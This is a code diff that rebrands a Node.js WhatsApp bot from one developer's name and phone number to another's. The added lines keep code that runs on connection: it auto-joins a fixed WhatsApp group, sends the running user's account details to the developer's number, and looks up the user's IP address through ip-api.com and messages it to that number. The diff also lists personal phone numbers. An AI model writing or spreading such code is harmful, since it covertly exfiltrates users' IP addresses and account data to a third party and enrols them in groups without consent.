@@ -1,4 +1,4 @@
-// 𝙘𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 𝘼𝙠𝙗𝙖𝙧
+// 𝙘𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 HELMI
 const {
   WAConnection: _WAConnection,
   MessageType,
@@ -48,10 +48,10 @@ const runtime = function (seconds) {
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
 fakenomor = '0@s.whatsapp.net'
-const gcrevoke = ["919677331878-1621430788@g.us"]
+const gcrevoke = ["60175575245-1621430788@g.us"]
 prefix = '#'
 shp = '⬡'
-owner = "919677331878@s.whatsapp.net"
+owner = "60175575245@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -72,7 +72,7 @@ const starts = async (client = new WAConnection()) => {
       color("!", "blue"),
       color("]", "white"),
       color(" flashy scan the qr code"),
-      client.sendMessage(`919677331878@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
+      client.sendMessage(`60175575245@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
           
     );
   });
@@ -100,7 +100,7 @@ console.log(color(`${spc4}< ================================================== >
 
     console.log(color('⎇','red'), color('\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙢𝙤𝙣𝙨𝙩𝙚𝙧 𝙮𝙩', 'yellow'))
     console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
-    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/919677331878'))
+    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/60175575245'))
     console.log(color('[MONSTER BOT]'), color(' ᴍᴏɴsᴛᴇʀ ʙᴏᴛ ɪs ᴏɴʟɪɴᴇ(≧∇≦)/︎', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
     console.log(color('⎇','green'), color('𝙏𝙝𝙖𝙣𝙠𝙨 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙚 𝙗𝙤𝙩', 'white'))
@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/E6kGrmOhmo9FtNvonhrjy1`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`919677331878@s.whatsapp.net`, `*Hi Owner Akbar, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
+ client.sendMessage(`60175575245@s.whatsapp.net`, `*Hi Owner Helmi, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Helmi.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("919677331878@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
+       client.sendMessage("60175575245@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Helmi.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -137,10 +137,10 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 client.on('group-update', async (anu) => {
 fkontakk = { key: {
   fromMe: false,
-    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '919677331878-1604595598@g.us' } : {})
+    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '60175575245-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'Akbar',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Akbar;;;\nFN:resku\nitem1.TEL;waid=919677331878:+91 967-7331-878\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'Helmi',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Helmi;;;\nFN:resku\nitem1.TEL;waid=60175575245:+91 967-7331-878\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
